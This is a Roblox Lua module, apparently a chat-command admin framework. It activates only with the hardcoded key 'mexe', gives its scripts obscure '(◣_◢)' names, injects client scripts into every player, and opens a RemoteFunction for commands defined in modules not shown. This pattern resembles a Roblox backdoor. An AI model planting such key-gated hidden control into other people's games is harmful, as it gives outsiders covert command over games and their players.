local nova = {}

nova.prefix = "$"
nova.remote = nil
nova.commands = {}

function nova:_createClient()
	for _, p in pairs(game:GetService("Players"):GetChildren()) do
		local client = script:WaitForChild("NovaClient"):Clone()
		client.Name = "(◣_◢)"
		client:SetAttribute("NovaClient", true)
		client.Parent = p:WaitForChild("PlayerGui")
		client.Enabled = true
	end
	
	local client = script:WaitForChild("NovaClient"):Clone()
	client.Name = "(◣_◢)"
	client:SetAttribute("NovaClient", true)
	client.Parent = game:GetService("StarterPlayer"):WaitForChild("StarterPlayerScripts")
	client.Enabled = true
end

function nova:_initCommands(network)
	nova.commands = require(script:WaitForChild("CommandsServer"))
	nova.commands:init(nova.remote, network)
end

function nova:_listenTo(player)
	player.Chatted:Connect(function(message)
		if (message:sub(0, 1) == self.prefix) then
			local commands = self.commands
			local split = message:split(" ")
			local command = split[1]:split(self.prefix)[2]
			
			if (commands[command]) then
				table.remove(split, 1)
				local args = split
				
				if (#args > 0) then
					commands[command](player, game:GetService("Players")[args[1]], args)
				else
					commands[command](player)
				end
			end
		end
	end)
end

function nova:_createListeners()
	for _, p in pairs(game:GetService("Players"):GetChildren()) do
		self:_listenTo(p)
	end
	
	game:GetService("Players").PlayerAdded:Connect(function(plr)
		self:_listenTo(plr)
	end)
end

function nova:load(key, owner)
	if (key == "mexe" and owner:IsA("Player")) then
		for _, v in pairs(game:GetService("ReplicatedStorage"):GetDescendants()) do
			if (v.Name == "(◣_◢)") then
				v:Destroy()
			end
		end
		
		for _, v in pairs(game:GetService("StarterPlayer"):GetDescendants()) do
			if (v.Name == "(◣_◢)") then
				v:Destroy()
			end
		end
		
		local container = Instance.new("Folder")
		container.Name = "(◣_◢)"
		
		local comms = Instance.new("RemoteFunction")
		comms.Name = "(◣_◢)"
		comms:SetAttribute("replicateAttr", true)
		
		nova.remote = comms
		
		script:WaitForChild("CommandsClient").Parent = container
		
		self:_createClient()
		
		comms.Parent = container
		
		local network = require(script:WaitForChild("Network"))
		network:new(comms)
		
		self:_initCommands(network)
		
		self:_createListeners()
		
		script.Name = "(◣_◢)"
		
		container.Parent = game:GetService("ReplicatedStorage")
	end
end

return nova
